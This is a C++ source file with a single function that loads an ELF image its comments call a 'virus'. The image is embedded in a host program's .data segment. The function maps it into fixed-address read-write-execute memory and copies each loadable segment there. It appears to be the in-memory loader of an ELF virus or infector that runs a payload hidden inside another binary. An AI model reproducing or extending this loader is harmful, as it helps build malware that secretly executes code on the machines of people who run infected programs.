#include "elfHeader.h"

void reload(char *buffer ,  ADDR fixedAddr ,struct_elf& virus_analyse_result)
{
    //Analyse virus elf, get ehdr,phdr.
    ADDR elf_image_base_addr = (ADDR)buffer;
    Elf32_Ehdr *elfhdr = (Elf32_Ehdr*)elf_image_base_addr;
    Elf32_Phdr *phdr = (Elf32_Phdr*)(elfhdr->e_phoff + elf_image_base_addr);
    virus_analyse_result.ehdr = *elfhdr;
    virus_analyse_result.phdr = phdr;

    //Copy virus data from .data segment of host to a temporary memory of host.
    //First, get loaded size of virus elf file.
    unsigned int elf_loaded_size = 0;
    int i = 0;
    int first_indx = -1;
    int last_indx = -1;
    Elf32_Addr min = 0xffffffff;
    Elf32_Addr max = 0x0;
    Elf32_Phdr *temp = phdr;

    for(; i<virus_analyse_result.ehdr.e_phnum; ++i,++temp)
    {
        if(temp->p_type == PT_LOAD)
        {
            DEBUG(cout<<"Min Page align: 0x"<<hex<<(unsigned int)(ELF_MIN_ALIGN(temp->p_align))<<'\t';)
            DEBUG(cout<<"Page start: 0x"<<hex<<(unsigned int)(ELF_PAGESTART(temp->p_vaddr, temp->p_align))<<'\t';)
            DEBUG(cout<<"Page offset: 0x"<<hex<<(unsigned int)(ELF_PAGEOFFSET(temp->p_vaddr, temp->p_align))<<'\t';)
            DEBUG(cout<<"Page align: 0x"<<(unsigned int)(ELF_PAGEALIGN(temp->p_vaddr, temp->p_align))<<endl;)

            if(temp->p_vaddr < min)
            {
                min = temp->p_vaddr;
                first_indx = i;
            }
            if((temp->p_vaddr + temp->p_memsz) > max)
            {
                max = temp->p_vaddr + temp->p_memsz;
                last_indx = i;
            }
        }
    }

    if(first_indx < last_indx)
    {
        DEBUG(cout<<"addr1: 0x"<<hex<<(phdr)[last_indx].p_vaddr<<endl;)
        DEBUG(cout<<"addr2: 0x"<<hex<<(phdr)[last_indx].p_memsz<<endl;)
        DEBUG(cout<<"addr3: 0x"<<hex<<(unsigned int)ELF_PAGESTART((phdr)[first_indx].p_vaddr, (phdr)[first_indx].p_align)<<endl;)
        elf_loaded_size = (phdr)[last_indx].p_vaddr + (phdr)[last_indx].p_memsz - ELF_PAGESTART((phdr)[first_indx].p_vaddr, (phdr)[first_indx].p_align);
    }
    else
    {
        DEBUG(cout<<"The virus elf file is wrong, there are not loaded segments."<<endl;)
        exit(-1);
    }

    DEBUG(cout<<"Min index: "<<first_indx<<endl;)
    DEBUG(cout<<"Max index: "<<last_indx<<endl;)
    DEBUG(cout<<"Total size: 0x"<<hex<<(unsigned int)elf_loaded_size<<endl;)
    elf_loaded_size = ELF_PAGEALIGN(elf_loaded_size, PAGE_MIN_ALIGN);
    virus_analyse_result.elf_loadsize = (unsigned int)elf_loaded_size;
    DEBUG(cout<<"Total size: 0x"<<hex<<(unsigned int)elf_loaded_size<<endl;)
    Elf32_Addr elf_loadbase_addr = (phdr)[first_indx].p_vaddr;
    elf_loadbase_addr = ELF_PAGESTART(elf_loadbase_addr, (phdr)[first_indx].p_align);
    virus_analyse_result.elf_loadbase_addr = (ADDR)elf_loadbase_addr;

    virus_map_base = mmap((void *) fixedAddr , virus_analyse_result.elf_loadsize, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_SHARED|MAP_FIXED, -1, 0);
    if(virus_map_base == NULL)
    {
        DEBUG(cout<<"Map elf failed!"<<endl;)
        exit(-1);
    }

    Elf32_Word offset = (ADDR)virus_map_base - virus_analyse_result.elf_loadbase_addr;
    DEBUG(cout<<"offset : 0x"<<hex<< offset << endl;)
    i = first_indx;
    while(i<=last_indx)
    {
        ADDR src_map_addr = phdr[i].p_offset + elf_image_base_addr;
        ADDR dest_map_addr = (phdr)[i].p_vaddr + offset;
        memcpy((void *)dest_map_addr, (void *)src_map_addr, (phdr)[i].p_filesz);

        DEBUG(cout<<"Virtual addr: 0x"<<hex<<(phdr)[i].p_vaddr<<endl;)
        DEBUG(cout<<"Virtual size: 0x"<<hex<<(phdr)[i].p_filesz<<endl;)
        DEBUG(cout<<"File offset: 0x"<<hex<<(phdr)[i].p_offset<<endl;)
        DEBUG(cout<<"Src mapped addr: 0x"<<hex<<src_map_addr<<endl;)
        DEBUG(cout<<"Dest mapped addr: 0x"<<hex<<dest_map_addr<<endl;)
        ++i;
    }
}

        
